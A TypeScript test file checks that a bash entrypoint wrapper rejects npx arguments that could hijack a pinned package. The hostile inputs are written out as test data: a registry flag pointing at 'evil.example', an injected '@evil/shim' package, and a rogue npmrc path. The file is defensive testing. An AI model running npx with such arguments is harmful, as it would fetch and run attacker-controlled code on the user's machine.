import { describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

// Supply-chain tests for the wrapper's argument validation only: every case
// here is refused (exit 64) before the script looks for the built CLI, starts
// the Loom shim, or runs anything, so no test can reach the network.
const SCRIPT = fileURLToPath(new URL('../../../scripts/darwin-entrypoint.sh', import.meta.url));

function runWrapper(args: string[]): { code: number; stderr: string } {
  try {
    execFileSync('bash', [SCRIPT, ...args], { encoding: 'utf8', timeout: 15000 });
    return { code: 0, stderr: '' };
  } catch (e) {
    const err = e as { status?: number | null; stderr?: string };
    return {
      code: typeof err.status === 'number' ? err.status : -1,
      stderr: err.stderr ?? '',
    };
  }
}

describe('darwin-entrypoint: the pin must own resolution, not just the version', () => {
  it('refuses --registry before the pin: a byte-exact pin resolves wherever npm is pointed', () => {
    const r = runWrapper([
      'npx', '--registry', 'https://evil.example', '@metaharness/darwin@0.10.2',
      'evolve', '.', '--sandbox', 'mock',
    ]);
    expect(r.code).toBe(64);
    expect(r.stderr).toContain('before the pinned darwin package');
  });

  it('refuses nopt abbreviations (--reg) identically', () => {
    const r = runWrapper([
      'npx', '--reg', 'https://evil.example', '@metaharness/darwin@0.10.2',
      'evolve', '.', '--sandbox', 'mock',
    ]);
    expect(r.code).toBe(64);
    expect(r.stderr).toContain('before the pinned darwin package');
  });

  it('refuses -p/--package before the pin (co-installed command injection)', () => {
    const r = runWrapper([
      'npx', '-p', '@evil/shim@9.9.9', '@metaharness/darwin@0.10.2',
      'evolve', '.', '--sandbox', 'mock',
    ]);
    expect(r.code).toBe(64);
    expect(r.stderr).toContain('before the pinned darwin package');
  });

  it('refuses --userconfig before the pin (a rogue npmrc remaps the registry)', () => {
    const r = runWrapper([
      'npx', '--userconfig', '/tmp/evil-npmrc', '@metaharness/darwin@0.10.2',
      'evolve', '.', '--sandbox', 'mock',
    ]);
    expect(r.code).toBe(64);
    expect(r.stderr).toContain('before the pinned darwin package');
  });

  it('still refuses post-pin equals-forms with the darwin-specific message (arm order is load-bearing)', () => {
    // If the new pre-pin arm matched first, the darwin-specific guard would be
    // dead code and this would report the generic resolution message instead.
    const r = runWrapper(['npx', '@metaharness/darwin@0.10.2', 'evolve', '.', '--sandbox=mock']);
    expect(r.code).toBe(64);
    expect(r.stderr).toContain("darwin ignores '--sandbox=mock'");
  });

  it('still lets post-pin darwin flags reach the sandbox check untouched', () => {
    const r = runWrapper(['npx', '@metaharness/darwin@0.10.2', 'evolve', '.', '--sandbox', 'real']);
    expect(r.code).toBe(64);
    expect(r.stderr).toContain("sandbox 'real' refused");
    expect(r.stderr).not.toContain('before the pinned darwin package');
  });
});
